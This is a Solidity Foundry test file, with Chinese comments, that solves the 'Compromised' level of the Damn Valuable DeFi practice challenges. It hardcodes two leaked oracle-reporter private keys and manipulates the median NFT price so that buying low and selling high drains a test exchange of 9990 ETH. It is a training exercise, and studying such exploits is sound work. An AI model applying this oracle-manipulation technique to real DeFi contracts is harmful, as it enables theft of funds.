// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";

import {Exchange} from "../../../src/Contracts/compromised/Exchange.sol";
import {TrustfulOracle} from "../../../src/Contracts/compromised/TrustfulOracle.sol";
import {TrustfulOracleInitializer} from "../../../src/Contracts/compromised/TrustfulOracleInitializer.sol";
import {DamnValuableNFT} from "../../../src/Contracts/DamnValuableNFT.sol";
import "forge-std/console.sol";

contract Compromised is Test {
    uint256 internal constant EXCHANGE_INITIAL_ETH_BALANCE = 9990e18;
    uint256 internal constant INITIAL_NFT_PRICE = 999e18;

    Exchange internal exchange;
    TrustfulOracle internal trustfulOracle;
    TrustfulOracleInitializer internal trustfulOracleInitializer;
    DamnValuableNFT internal damnValuableNFT;
    address payable internal attacker;

    function setUp() public {
        address[] memory sources = new address[](3);

        sources[0] = 0xA73209FB1a42495120166736362A1DfA9F95A105;
        sources[1] = 0xe92401A4d3af5E446d93D11EEc806b1462b39D15;
        sources[2] = 0x81A5D6E50C214044bE44cA0CB057fe119097850c;

        attacker = payable(
            address(uint160(uint256(keccak256(abi.encodePacked("attacker")))))
        );
        vm.deal(attacker, 0.1 ether);
        vm.label(attacker, "Attacker");
        assertEq(attacker.balance, 0.1 ether); // attacker只有0.1 ether初始资金,买不起任何一个NFT

        // Initialize balance of the trusted source addresses
        uint256 arrLen = sources.length;
        for (uint8 i = 0; i < arrLen; ) {
            vm.deal(sources[i], 2 ether); // 每个报价者地址的初始资金是2 ether
            assertEq(sources[i].balance, 2 ether);
            unchecked {
                ++i;
            }
        }

        string[] memory symbols = new string[](3);
        for (uint8 i = 0; i < arrLen; ) {
            symbols[i] = "DVNFT"; // 每个symbol都设置成DVNFT
            unchecked {
                ++i;
            }
        }

        uint256[] memory initialPrices = new uint256[](3);
        for (uint8 i = 0; i < arrLen; ) {
            initialPrices[i] = INITIAL_NFT_PRICE; // 该NFT合约的每一个NFT初始价格都是999 ether
            unchecked {
                ++i;
            }
        }

        // Deploy the oracle and setup the trusted sources with initial prices
        trustfulOracle = new TrustfulOracleInitializer(
            sources,
            symbols,
            initialPrices
        ).oracle();
        // trustfulOracle是预言机实例,初始化了报价者地址,NFT的symbol,以及初始价格
        // 这三个地址对NFT的初始报价都是999ether

        // Deploy the exchange and get the associated ERC721 token
        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(
            address(trustfulOracle)
        );
        
        damnValuableNFT = exchange.token();

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    // 只给了初始报价. 并且由于符号是相同的DVNFT,所以所有由DVNFT合约 mint出来的NFT都是一个价格
    // 每次buyOne被调用的时候,NFT合约都从预言机里通过getMedianPrice拿最新的价格数据以确定这笔买卖能否进行
    // 每次sellOne调用的时候,NFT合约都从预言机里通过getMedianPrice拿最新的价格数据并给原NFT所有者打钱并销毁该NFT
    // 注意一件事,EXCHANGE中的初始资金是9990 ether,是999 ether的10倍,这其中是不是有什么关系呢?
    function testExploit() public {
        // base64(ascii(hex string)),最终得到私钥
        uint256 source1priKey=0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9;
        uint256 source2priKey=0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48;
        
        // 有了第二个和第三个报价账户的私钥,现在只需要在同一笔交易中伪造报价即可
        // 第一个报价账户是无法被利用的,它的报价始终是999,因此我们伪造一个0.01和0.1的报价,这样可以mint到手里一个NFT
        // 然后卖给Exchange,当然要首先伪造9990.01的价格,即报价账户一个报价100000,一个报价9990.1
        // 这样NFT被卖出,Exchange被掏空
        // 最后再伪造一个999的报价即可
        /** EXPLOIT START **/
        address source1Address=vm.addr(source1priKey);
        address source2Address=vm.addr(source2priKey);

        vm.prank(source1Address);
        trustfulOracle.postPrice("DVNFT",0.01 ether);

        vm.prank(source2Address);
        trustfulOracle.postPrice("DVNFT",0.1 ether);

        ERC721Receiver re=new ERC721Receiver();

        vm.etch(attacker,address(re).code);
        vm.prank(attacker);
        uint256 id=exchange.buyOne{value:0.1 ether}();
        assertEq(damnValuableNFT.balanceOf(attacker),1);
        
        // 伪造高昂报价
        vm.prank(source1Address);
        trustfulOracle.postPrice("DVNFT",100000 ether);

        vm.prank(source2Address);
        trustfulOracle.postPrice("DVNFT",9990.1 ether);

        assertEq(9990.1 ether,trustfulOracle.getMedianPrice("DVNFT") );

        // 卖出NFT
        vm.startPrank(attacker);
        damnValuableNFT.approve(address(exchange),id);
        exchange.sellOne(id);
        vm.stopPrank();
        
        // 修改报价
        vm.prank(source1Address);
        trustfulOracle.postPrice("DVNFT",999 ether);

        vm.prank(source2Address);
        trustfulOracle.postPrice("DVNFT",999 ether);

        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        // Exchange must have lost all ETH
        assertEq(address(exchange).balance, 0);

        // Attacker's ETH balance must have significantly increased
        assertGt(attacker.balance, EXCHANGE_INITIAL_ETH_BALANCE);

        // Attacker must not own any NFT
        assertEq(damnValuableNFT.balanceOf(attacker), 0);

        // NFT price shouldn't have changed
        assertEq(trustfulOracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
    }
}

contract ERC721Receiver {
    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external virtual returns (bytes4) {
        return 0x150b7a02;
    }
    fallback() external payable{}
}
